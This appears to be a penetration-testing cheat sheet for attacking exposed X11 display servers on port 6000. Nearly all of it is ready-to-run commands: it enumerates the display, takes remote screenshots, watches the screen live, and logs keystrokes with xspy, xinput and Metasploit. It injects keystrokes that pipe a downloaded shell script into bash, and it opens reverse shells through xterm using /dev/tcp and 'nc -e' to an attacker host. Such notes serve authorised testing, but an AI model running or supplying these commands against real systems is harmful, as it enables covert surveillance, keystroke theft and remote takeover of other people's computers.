# Port 6000 - X11

## Table of Contents
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Keylogging](#keylogging)

---

## Enumeration

### Nmap

```shell
nmap -sV -sC -p 6000-6005 $rhost
nmap -p 6000 --script x11-access $rhost
```

### Check Access

```shell
# Check if X11 is open
xdpyinfo -display $rhost:0

# Using xwininfo
xwininfo -root -display $rhost:0
```

---

## Exploitation

### Screenshot Capture

```shell
# Capture screenshot
xwd -root -display $rhost:0 -out screenshot.xwd

# Convert to PNG
convert screenshot.xwd screenshot.png

# Or use ImageMagick
import -window root -display $rhost:0 screenshot.png
```

### Watch Screen in Real-time

```shell
# Install xspy
xspy $rhost

# Or use xwatchwin
xwatchwin -display $rhost:0 root
```

### Send Keystrokes

```shell
# Using xdotool (requires DISPLAY set)
DISPLAY=$rhost:0 xdotool type "malicious command"
DISPLAY=$rhost:0 xdotool key Return

# Open terminal and execute
DISPLAY=$rhost:0 xdotool key ctrl+alt+t
sleep 1
DISPLAY=$rhost:0 xdotool type "curl http://$lhost/shell.sh | bash"
DISPLAY=$rhost:0 xdotool key Return
```

---

## Keylogging

### Using xspy

```shell
# Compile xspy
git clone https://github.com/mnp/xspy.git
cd xspy
make

# Run keylogger
./xspy $rhost:0
```

### Using xinput

```shell
# List input devices
DISPLAY=$rhost:0 xinput list

# Monitor keyboard
DISPLAY=$rhost:0 xinput test <keyboard_id>
```

---

## Metasploit

```shell
# X11 keyboard capture
use auxiliary/scanner/x11/open_x11
set RHOSTS $rhost
run

# Keylogging
use post/linux/gather/x11_keyboard_capture
set SESSION <session_id>
set DISPLAY $rhost:0
run
```

---

## Reverse Shell via X11

```shell
# If you have X11 access, open xterm
DISPLAY=$rhost:0 xterm -e "bash -i >& /dev/tcp/$lhost/$lport 0>&1" &

# Or run arbitrary command
DISPLAY=$rhost:0 xterm -e "nc -e /bin/sh $lhost $lport" &
```

---

## X11 Forwarding via SSH

```shell
# If SSH access with X11 forwarding
ssh -X user@$rhost

# Run GUI application
firefox &
```

---

## Quick Reference

| Command | Description |
| :--- | :--- |
| `xdpyinfo -display $rhost:0` | Check X11 access |
| `xwd -root -display $rhost:0 -out screen.xwd` | Take screenshot |
| `xspy $rhost:0` | Keylog X11 session |
| `DISPLAY=$rhost:0 xdotool type "text"` | Send keystrokes |

| Port | Display |
| :--- | :--- |
| 6000 | :0 |
| 6001 | :1 |
| 6002 | :2 |
